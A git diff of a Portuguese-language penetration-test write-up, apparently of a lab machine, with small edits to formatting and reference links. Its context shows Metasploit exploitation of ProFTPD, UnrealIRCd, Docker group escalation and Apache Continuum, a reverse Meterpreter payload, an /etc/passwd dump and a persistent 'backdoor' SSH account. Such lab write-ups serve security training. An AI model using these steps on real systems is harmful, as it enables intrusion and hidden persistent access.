@@ -77,7 +77,7 @@ Comando: `nmap -sV --script vuln -p 21,22,80,445,631,3306,3500,6697,8080 -oN met
 
 ### ProFTPD
 
-Para obter acesso inicial à máquina alvo, exploramos uma vulnerabilidade no serviço ProFTPD (versão 1.3.5) utilizando o módulo do Metasploit `exploit/unix/ftp/proftpd_modcopy_exec`, que explora a falha identificada como CVE-2015-3306.
+Para obter acesso inicial à máquina alvo, exploramos uma vulnerabilidade no serviço ProFTPD (versão 1.3.5) utilizando o módulo do Metasploit `exploit/unix/ftp/proftpd_modcopy_exec`:
 
 **Configuração do Módulo**  
   
@@ -119,7 +119,7 @@ Exploit target:
 
 **Resultados Obtidos**  
 
-Foi aberta uma sessão de shell que evidenciou o acesso inicial com o usuário www-data:
+Foi aberta uma sessão de shell que evidenciou o acesso inicial com o usuário `www-data`:
 
 ```console
 msf6 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
@@ -223,12 +223,6 @@ avahi:x:107:114:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
 colord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/false
 ```
 
-**Referências**
-
-- MITRE – CVE-2015-3306: https://www.cve.org/CVERecord?id=CVE-2015-3306
-
-- Rapid7 – Módulo do Exploit: https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/
-
 - [Detalhamento](/doc/proftp.md)
 
 
@@ -292,10 +286,6 @@ id
 uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
 ```
 
-**Referências:**
-
-- Rapid7 – Módulo do Exploit: https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/
-
 ### Docker
 
 Após obter acesso inicial ao sistema com o usuário `boba_fett`, foi identificado que este usuário fazia parte do grupo docker, o que permitia a execução de comandos diretamente no daemon Docker sem privilégios elevados.
@@ -317,7 +307,8 @@ REPOSITORY          TAG                 IMAGE ID            CREATED             
 ubuntu              latest              d70eaf7277ea        4 years ago         72.9MB
 ```
 
-**Configuração do Módulo**
+**Configuração do Módulo**  
+
 Foi utilizado o módulo `exploit/linux/local/docker_daemon_privilege_escalation`, que permite a execução de um contêiner privilegiado e, consequentemente, a obtenção de acesso root no sistema:
 
 
@@ -339,7 +330,7 @@ Payload options (linux/x64/meterpreter/reverse_tcp):
 ```
 **Execução do Exploit**
 
-O exploit foi executado para iniciar um contêiner Docker privilegiado e fornecer acesso como root:
+O exploit foi executado para iniciar um contêiner Docker privilegiado e fornecer acesso como `root`:
 
 ```console
 sf6 exploit(linux/local/docker_daemon_privilege_escalation) > run
@@ -420,7 +411,7 @@ Exploit target:
    0   Apache Continuum <= 1.4.2
 ```
 **Execução do Exploit:**  
-Ao executar o exploit, o payload foi injetado com sucesso e uma conexão reversa foi estabelecida, resultando na abertura de uma sessão Meterpreter com privilégios de root.
+Ao executar o exploit, o payload foi injetado com sucesso e uma conexão reversa foi estabelecida, resultando na abertura de uma sessão Meterpreter com privilégios de `root`.
 
 ```console
 msf6 exploit(linux/http/apache_continuum_cmd_exec) > exploit
@@ -472,7 +463,7 @@ chown -R backdoor:backdoor /home/backdoor/.ssh
 ```
 
 **Teste de Acesso via SSH:**   
-Utilizando a chave privada correspondente (armazenada em ~/.ssh/id_ed25519), foi realizado o teste de conexão: Utilizando a chave privada correspondente (armazenada em ~/.ssh/id_ed25519), foi realizado o teste de conexão:
+Utilizando a chave privada correspondente (armazenada em ~/.ssh/id_ed25519), foi realizado o teste de conexão:
 
 ```console
 └─$ ssh -i ~/.ssh/id_ed25519 backdoor@192.168.0.207
